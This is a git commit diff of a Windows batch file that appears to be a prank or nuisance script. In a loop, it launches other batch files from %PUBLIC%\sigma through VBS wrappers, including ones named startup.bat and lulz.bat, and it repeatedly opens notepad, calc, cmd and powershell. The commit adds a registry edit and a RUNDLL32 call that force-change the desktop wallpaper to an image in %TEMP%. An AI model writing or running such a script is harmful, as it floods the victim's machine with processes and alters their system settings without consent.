ddac294df05bee469bb0cced54f22231bbdc9722
AXL.Alixx <58485851+axlalixx@users.noreply.github.com>
2024-12-20 02:25:57 +0000

    Update filel.bat

--- filel.bat
+++ filel.bat
@@ -6,8 +6,13 @@ wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\sigma.bat
 wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\copy.bat
 wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\startup.bat
 wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\lulz.bat
+
 start notepad
 start calc
 start cmd
 start powershell
+
+reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%TEMP%\image3.jpg" /f
+RUNDLL32.EXE user32.dll,UpdatePerUser SystemParameters
+
 goto loop
